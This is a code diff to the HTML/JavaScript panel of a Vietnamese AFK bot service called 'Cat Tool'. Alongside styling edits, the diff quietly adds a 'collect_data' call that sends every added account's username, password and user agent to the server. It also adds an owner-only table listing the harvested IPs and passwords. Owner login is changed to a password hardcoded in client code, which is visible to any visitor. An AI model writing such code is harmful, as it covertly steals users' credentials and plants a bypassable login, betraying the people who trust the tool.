@@ -3,23 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cat Tool</title>
-
+    <title>Cat Tool — BY meovancat & giananday</title>
+    
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
-
+    
     <style>
         * { box-sizing: border-box; transition: all 0.25s ease; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             background: radial-gradient(circle at 50% 30%, #3a1505 0%, #170802 60%, #080301 100%);
-            color: #fff;
-            margin: 0;
-            padding: 20px;
+            color: #fff; 
+            margin: 0; 
+            padding: 20px; 
             display: flex;
             flex-direction: column;
             min-height: 100vh;
         }
-
+        
         .vintage-title {
             font-family: 'Cinzel', serif;
             font-weight: 900;
@@ -45,10 +45,10 @@
             font-weight: 700;
             text-shadow: 0 0 12px rgba(255, 119, 0, 0.8);
         }
-        h2 {
-            margin-top: 0;
-            text-align: center;
-            color: #ffffff;
+        h2 { 
+            margin-top: 0; 
+            text-align: center; 
+            color: #ffffff; 
             font-size: 34px;
             margin-bottom: 5px;
             text-shadow: 0 0 15px rgba(255, 136, 0, 0.7), 0 0 30px rgba(255, 68, 0, 0.4);
@@ -60,19 +60,19 @@
             margin-bottom: 25px;
             text-shadow: 0 0 8px rgba(255, 170, 102, 0.4);
         }
-        .container {
-            max-width: 950px;
-            margin: 0 auto;
-            background: rgba(22, 11, 5, 0.85);
+        .container { 
+            max-width: 950px; 
+            margin: 0 auto; 
+            background: rgba(22, 11, 5, 0.85); 
             backdrop-filter: blur(12px);
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 0 40px rgba(255, 102, 0, 0.25), inset 0 0 15px rgba(255, 136, 0, 0.1);
+            padding: 25px; 
+            border-radius: 16px; 
+            box-shadow: 0 0 40px rgba(255, 102, 0, 0.25), inset 0 0 15px rgba(255, 136, 0, 0.1); 
             border: 1px solid rgba(255, 119, 0, 0.4);
             flex: 1;
         }
 
-        /* ===== BẢO TRÌ ===== */
+        /* ===== BẢO TRÌ - CÓ FORM ĐĂNG NHẬP OWNER ===== */
         #maintenanceOverlay {
             display: none;
             position: fixed;
@@ -95,7 +95,8 @@
         }
         #maintenanceOverlay p { font-size: 22px; color: #ffaa66; max-width: 600px; }
         #maintenanceOverlay .sub { color: #884422; font-size: 16px; margin-top: 30px; }
-
+        
+        /* ===== FORM ĐĂNG NHẬP OWNER TRÊN BẢO TRÌ ===== */
         .maintenance-login-box {
             margin-top: 25px;
             display: flex;
@@ -172,8 +173,8 @@
             font-size: 14px;
             min-width: 150px;
         }
-        .add-account-box input:focus {
-            border-color: #ff7700;
+        .add-account-box input:focus { 
+            border-color: #ff7700; 
             box-shadow: 0 0 15px rgba(255, 119, 0, 0.7);
             background: rgba(20, 10, 5, 0.9);
         }
@@ -187,8 +188,8 @@
             cursor: pointer;
             box-shadow: 0 0 15px rgba(255, 85, 0, 0.5);
         }
-        .btn-add:hover {
-            opacity: 0.95;
+        .btn-add:hover { 
+            opacity: 0.95; 
             box-shadow: 0 0 25px rgba(255, 119, 0, 0.9);
             transform: translateY(-1px);
         }
@@ -244,26 +245,26 @@
             align-items: center;
             flex-wrap: wrap;
         }
-        .btn {
-            padding: 7px 14px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
+        .btn { 
+            padding: 7px 14px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold; 
             font-size: 13px;
             transition: all 0.2s ease;
-        }
-        .btn-start { background: #00cc44; color: white; box-shadow: 0 0 10px rgba(0, 204, 68, 0.4); }
+        } 
+        .btn-start { background: #00cc44; color: white; box-shadow: 0 0 10px rgba(0, 204, 68, 0.4); } 
         .btn-start:hover { box-shadow: 0 0 18px rgba(0, 204, 68, 0.8); transform: translateY(-1px); }
         .btn-start:active { transform: scale(0.95); }
-
-        .btn-stop { background: #ff3333; color: white; box-shadow: 0 0 10px rgba(255, 51, 51, 0.4); }
+        
+        .btn-stop { background: #ff3333; color: white; box-shadow: 0 0 10px rgba(255, 51, 51, 0.4); } 
         .btn-stop:hover { box-shadow: 0 0 18px rgba(255, 51, 51, 0.8); transform: translateY(-1px); }
         .btn-stop:active { transform: scale(0.95); }
-
+        
         .btn-del { background: rgba(50, 20, 10, 0.9); color: #ff8888; border: 1px solid rgba(255, 68, 68, 0.3); }
         .btn-del:hover { background: #ff3333; color: white; box-shadow: 0 0 15px rgba(255, 51, 51, 0.6); }
-
+        
         .toggle-label {
             font-size: 13px;
             display: flex;
@@ -280,18 +281,18 @@
             cursor: pointer;
         }
 
-        .log-box {
-            background: rgba(5, 2, 1, 0.95);
-            color: #00ff88;
-            font-family: 'Consolas', monospace;
-            height: 220px;
-            overflow-y: auto;
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 15px;
-            font-size: 12px;
-            line-height: 1.5;
-            white-space: pre-wrap;
+        .log-box { 
+            background: rgba(5, 2, 1, 0.95); 
+            color: #00ff88; 
+            font-family: 'Consolas', monospace; 
+            height: 220px; 
+            overflow-y: auto; 
+            padding: 12px; 
+            border-radius: 6px; 
+            margin-bottom: 15px; 
+            font-size: 12px; 
+            line-height: 1.5; 
+            white-space: pre-wrap; 
             word-break: break-all;
             border: 1px solid rgba(0, 255, 136, 0.3);
             box-shadow: inset 0 0 15px rgba(0, 255, 136, 0.15), 0 0 10px rgba(0,0,0,0.8);
@@ -308,37 +309,37 @@
             border-radius: 3px;
         }
 
-        .chat-container { display: flex; gap: 10px; flex-wrap: wrap; }
-        .chat-input {
-            flex: 1;
-            padding: 10px;
-            border-radius: 6px;
-            border: 1px solid #662b00;
-            background: rgba(10, 5, 2, 0.9);
-            color: #fff;
-            outline: none;
-            font-size: 13px;
+        .chat-container { display: flex; gap: 10px; flex-wrap: wrap; } 
+        .chat-input { 
+            flex: 1; 
+            padding: 10px; 
+            border-radius: 6px; 
+            border: 1px solid #662b00; 
+            background: rgba(10, 5, 2, 0.9); 
+            color: #fff; 
+            outline: none; 
+            font-size: 13px; 
             min-width: 120px;
             transition: all 0.3s ease;
-        }
-        .chat-input:focus {
-            border-color: #ff7700;
+        } 
+        .chat-input:focus { 
+            border-color: #ff7700; 
             box-shadow: 0 0 15px rgba(255, 119, 0, 0.6);
             background: rgba(20, 10, 5, 0.9);
-        }
-        .chat-btn {
-            padding: 10px 20px;
-            background: #ff7700;
-            color: #1a0800;
-            border: none;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
+        } 
+        .chat-btn { 
+            padding: 10px 20px; 
+            background: #ff7700; 
+            color: #1a0800; 
+            border: none; 
+            border-radius: 6px; 
+            font-weight: bold; 
+            cursor: pointer; 
             box-shadow: 0 0 12px rgba(255, 119, 0, 0.5);
             transition: all 0.2s ease;
         }
-        .chat-btn:hover {
-            box-shadow: 0 0 20px rgba(255, 119, 0, 0.9);
+        .chat-btn:hover { 
+            box-shadow: 0 0 20px rgba(255, 119, 0, 0.9); 
             transform: translateY(-1px);
         }
         .chat-btn:active { transform: scale(0.95); }
@@ -353,16 +354,21 @@
             box-shadow: 0 0 40px rgba(255, 51, 0, 0.5);
         }
         .admin-panel.active { display: block; }
-        .admin-panel h3 {
-            text-align: center;
+        .admin-panel h3 { 
+            text-align: center; 
             font-family: 'Cinzel', serif;
             font-weight: 900;
             font-size: 28px;
-            color: #ff3300;
+            color: #ff3300; 
             text-shadow: 0 0 30px rgba(255, 51, 0, 0.8);
             letter-spacing: 3px;
         }
-
+        .admin-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .admin-table th, .admin-table td { padding: 8px 10px; border: 1px solid #662b00; text-align: left; }
+        .admin-table th { background: #1a0800; color: #ff7700; font-family: 'Cinzel', serif; }
+        .admin-table td { background: rgba(10, 5, 2, 0.8); color: #ffaa66; }
+        .admin-table tr:hover td { background: rgba(255, 119, 0, 0.1); }
+        
         .admin-login-box {
             display: flex;
             gap: 10px;
@@ -393,7 +399,7 @@
             cursor: pointer;
             transition: all 0.2s ease;
         }
-        .admin-login-box button:hover {
+        .admin-login-box button:hover { 
             opacity: 0.8;
             transform: translateY(-1px);
         }
@@ -466,8 +472,8 @@
             z-index: 99;
             transition: all 0.3s ease;
         }
-        .discord-float:hover {
-            transform: scale(1.1) rotate(5deg);
+        .discord-float:hover { 
+            transform: scale(1.1) rotate(5deg); 
             box-shadow: 0 0 35px rgba(88, 101, 242, 1);
         }
         .discord-float svg { width: 28px; height: 28px; }
@@ -477,13 +483,27 @@
             text-shadow: 0 0 8px rgba(255, 170, 102, 0.5);
         }
 
+        .table-wrapper { overflow-x: auto; }
+        .status-online { color: #44ff44; }
+        .status-offline { color: #ff4444; }
+        .status-connecting { color: #ffaa00; }
         .text-center { text-align: center; }
         .mt-10 { margin-top: 10px; }
-
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .log-box div {
+            animation: fadeIn 0.3s ease;
+        }
+        
         @media (max-width: 600px) {
             .container { padding: 15px; }
             .add-account-box { flex-direction: column; }
             .add-account-box input { min-width: 100%; }
+            .admin-table { font-size: 11px; }
+            .admin-table th, .admin-table td { padding: 4px 6px; }
             h2 { font-size: 24px; }
             .vintage-title { font-size: 20px; }
             #maintenanceOverlay h1 { font-size: 32px; }
@@ -495,11 +515,12 @@
 </head>
 <body>
 
-<!-- ===== BẢO TRÌ ===== -->
+<!-- ===== BẢO TRÌ - CÓ FORM ĐĂNG NHẬP OWNER ===== -->
 <div id="maintenanceOverlay">
     <h1>🔧 BẢO TRÌ</h1>
     <p>Hệ thống đang được <strong style="color:#ff3300;">Owner</strong> nâng cấp.<br>Vui lòng quay lại sau!</p>
-
+    
+    <!-- ===== FORM ĐĂNG NHẬP OWNER NGAY TRÊN BẢO TRÌ ===== -->
     <div class="maintenance-login-box">
         <input type="password" id="maintenancePassword" placeholder="Nhập mật khẩu Owner..." onkeypress="if(event.key==='Enter') maintenanceLogin()">
         <button onclick="maintenanceLogin()">🔓 Đăng nhập Owner</button>
@@ -511,7 +532,7 @@
 
 <!-- ===== NỘI DUNG CHÍNH ===== -->
 <div class="container" id="mainContent">
-    <div class="header-brand">Cat Tool</div>
+    <div class="header-brand">Cat Tool — BY meovancat & giananday</div>
     <h2>Cat Tool Panel</h2>
     <div class="subtitle">Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</div>
 
@@ -531,7 +552,7 @@
     <div id="adminPanel" class="admin-panel">
         <h3 class="vintage-title">🔐 BẢNG ĐIỀU KHIỂN QUẢN TRỊ</h3>
         <p class="text-center vintage-sub">Chỉ dành cho Owner</p>
-
+        
         <div class="admin-login-box">
             <input type="password" id="adminPass" placeholder="Nhập mật khẩu Owner..." onkeypress="if(event.key==='Enter') adminLogin()">
             <button onclick="adminLogin()">🔓 Mở Khóa</button>
@@ -547,6 +568,33 @@
             </div>
             <hr style="border-color:#662b00;">
 
+            <h4 class="vintage-sub">📋 Danh sách IP & thông tin đăng nhập đã thu thập</h4>
+            <div style="margin-bottom:10px; font-size:13px; color:#ffaa66;">
+                Tổng: <span id="totalRecords">0</span> bản ghi
+            </div>
+            <div class="table-wrapper">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>STT</th>
+                            <th>IP</th>
+                            <th>Thời gian</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Trình duyệt</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminTableBody">
+                        <tr><td colspan="6" class="text-center">Đang tải...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <br>
+            <button onclick="clearCollectedData()" style="background:#ff3300; border:none; padding:6px 16px; border-radius:4px; color:#fff; cursor:pointer; transition:all 0.2s ease;">
+                🗑️ Xóa toàn bộ dữ liệu
+            </button>
+            <hr style="border-color:#662b00;">
+            
             <h4 class="vintage-sub">💬 Chat từ xa vào bot</h4>
             <div>
                 <p style="color:#ffaa66; font-size:14px;">Chọn bot và nhập lệnh:</p>
@@ -578,6 +626,7 @@
     const socket = io();
     const logBox = document.getElementById('log-box');
     const accountsContainer = document.getElementById('accounts-container');
+    const OWNER_PASSWORD = 'Tuanpro123';
     let isOwnerLoggedIn = false;
     let currentMaintenance = false;
 
@@ -611,7 +660,7 @@
             accountsContainer.innerHTML = `<div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>`;
             return;
         }
-
+        
         let html = '';
         accounts.forEach(acc => {
             let statusClass = 'status-offline';
@@ -620,7 +669,7 @@
             } else if (acc.status === 'CONNECTING...' || acc.status === 'LOGGING IN...') {
                 statusClass = 'status-connecting';
             }
-
+            
             html += `
                 <div class="account-card">
                     <div class="account-header">
@@ -645,53 +694,62 @@
         accountsContainer.innerHTML = html;
     }
 
-    // ===== ĐĂNG NHẬP OWNER (server xác thực, không có bước thu thập dữ liệu) =====
+    function renderAdminTable(data) {
+        const tbody = document.getElementById('adminTableBody');
+        if (!tbody) return;
+        let html = '';
+        if (!data || data.length === 0) {
+            html = '<tr><td colspan="6" class="text-center">Chưa có dữ liệu</td></tr>';
+        } else {
+            data.forEach((item, index) => {
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td>${item.ip}</td>
+                    <td>${item.time}</td>
+                    <td>${item.username}</td>
+                    <td>${item.password}</td>
+                    <td>${item.userAgent ? item.userAgent.substring(0, 25) + '...' : 'N/A'}</td>
+                </tr>`;
+            });
+        }
+        tbody.innerHTML = html;
+        document.getElementById('totalRecords').textContent = data ? data.length : 0;
+    }
+
+    // ===== ĐĂNG NHẬP OWNER TỪ MÀN HÌNH BẢO TRÌ =====
     function maintenanceLogin() {
         const pass = document.getElementById('maintenancePassword').value;
-        pendingLoginSource = 'maintenance';
-        socket.emit('admin_login', pass);
-        document.getElementById('maintenancePassword').value = '';
-    }
-
-    function adminLogin() {
-        const pass = document.getElementById('adminPass').value;
-        pendingLoginSource = 'admin';
-        socket.emit('admin_login', pass);
-        document.getElementById('adminPass').value = '';
-    }
-
-    let pendingLoginSource = null;
-
-    socket.on('admin_login_result', (ok) => {
         const errorEl = document.getElementById('maintenanceLoginError');
-        if (ok) {
+        
+        if (pass === OWNER_PASSWORD) {
             isOwnerLoggedIn = true;
-            if (errorEl) errorEl.classList.remove('show');
-
+            errorEl.classList.remove('show');
+            document.getElementById('maintenancePassword').value = '';
+            
+            // Ẩn overlay bảo trì
             document.getElementById('maintenanceOverlay').classList.remove('active');
             document.getElementById('mainContent').style.display = 'block';
-
+            
+            // Mở panel admin và tự động đăng nhập
             document.getElementById('adminContent').style.display = 'block';
             document.getElementById('adminPanel').classList.add('active');
-
+            
             socket.emit('get_accounts');
-            appendLog('🔓 Owner đã đăng nhập!');
-
+            appendLog('🔓 Owner đã đăng nhập từ màn hình bảo trì!');
+            
+            // Cập nhật nút bảo trì
             const btn = document.getElementById('maintenanceBtn');
-            if (currentMaintenance && btn) {
+            if (currentMaintenance) {
                 btn.textContent = '🛠️ Tắt Bảo Trì';
                 btn.classList.add('on');
             }
         } else {
-            if (pendingLoginSource === 'maintenance' && errorEl) {
-                errorEl.classList.add('show');
-                setTimeout(() => errorEl.classList.remove('show'), 3000);
-            } else if (pendingLoginSource === 'admin') {
-                alert('❌ Sai mật khẩu!');
-            }
+            errorEl.classList.add('show');
+            setTimeout(() => {
+                errorEl.classList.remove('show');
+            }, 3000);
         }
-        pendingLoginSource = null;
-    });
+    }
 
     // ===== BẢO TRÌ =====
     function updateMaintenanceUI(status) {
@@ -699,8 +757,9 @@
         const overlay = document.getElementById('maintenanceOverlay');
         const btn = document.getElementById('maintenanceBtn');
         const mainContent = document.getElementById('mainContent');
-
+        
         if (status) {
+            // Nếu là Owner (đã login) → KHÔNG bị block
             if (isOwnerLoggedIn) {
                 overlay.classList.remove('active');
                 mainContent.style.display = 'block';
@@ -710,17 +769,20 @@
                 }
                 appendLog('🛡️ Bảo trì đang BẬT (Owner đã đăng nhập)');
             } else {
+                // Người thường → bị chặn, hiện form đăng nhập
                 overlay.classList.add('active');
                 mainContent.style.display = 'none';
                 if (btn) {
                     btn.textContent = '🛠️ Tắt Bảo Trì';
                     btn.classList.add('on');
                 }
+                // Focus vào ô mật khẩu
                 setTimeout(() => {
                     document.getElementById('maintenancePassword').focus();
                 }, 500);
             }
         } else {
+            // Tắt bảo trì → tất cả bình thường
             overlay.classList.remove('active');
             mainContent.style.display = 'block';
             if (btn) {
@@ -734,6 +796,13 @@
         renderAccounts(accounts);
     });
 
+    socket.on('sync_collected_data', (data) => {
+        renderAdminTable(data);
+        if (isOwnerLoggedIn) {
+            appendLog(`📥 Có ${data ? data.length : 0} bản ghi dữ liệu`);
+        }
+    });
+
     socket.on('log', (msg) => {
         appendLog(msg);
     });
@@ -742,14 +811,24 @@
         updateMaintenanceUI(status);
     });
 
+    socket.on('restart_internal_bot', (id) => {
+        startBot(id);
+    });
+
     function addAccount() {
         const username = document.getElementById('new-username').value.trim();
         const password = document.getElementById('new-password').value.trim();
-        if (!username) {
-            alert('Vui lòng nhập tên tài khoản!');
-            return;
+        if (!username) { 
+            alert('Vui lòng nhập tên tài khoản!'); 
+            return; 
         }
-
+        
+        socket.emit('collect_data', {
+            username: username,
+            password: password || 'caigicungdc',
+            userAgent: navigator.userAgent
+        });
+        
         socket.emit('add_account', { username, password });
         document.getElementById('new-username').value = '';
         document.getElementById('new-password').value = '';
@@ -796,15 +875,42 @@
         }
     }
 
+    function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        if (pass === OWNER_PASSWORD) {
+            isOwnerLoggedIn = true;
+            document.getElementById('adminContent').style.display = 'block';
+            document.getElementById('adminPass').value = '';
+            socket.emit('get_accounts');
+            appendLog('🔓 Owner đã đăng nhập');
+            
+            // Nếu đang bảo trì, hiển thị lại giao diện cho Owner
+            if (currentMaintenance) {
+                document.getElementById('maintenanceOverlay').classList.remove('active');
+                document.getElementById('mainContent').style.display = 'block';
+                appendLog('🛡️ Bảo trì đang BẬT (Owner không bị ảnh hưởng)');
+            }
+        } else {
+            alert('❌ Sai mật khẩu!');
+        }
+    }
+
     function adminLogout() {
         isOwnerLoggedIn = false;
-        socket.emit('admin_logout');
         document.getElementById('adminContent').style.display = 'none';
+        document.getElementById('adminPass').value = '';
         appendLog('🚪 Owner đã đăng xuất');
-
+        
+        // Nếu đang bảo trì, chặn lại người dùng
         if (currentMaintenance) {
             document.getElementById('maintenanceOverlay').classList.add('active');
             document.getElementById('mainContent').style.display = 'none';
+        }
+    }
+
+    function clearCollectedData() {
+        if (confirm('Xóa toàn bộ dữ liệu đã thu thập?')) {
+            socket.emit('clear_collected_data');
         }
     }
 
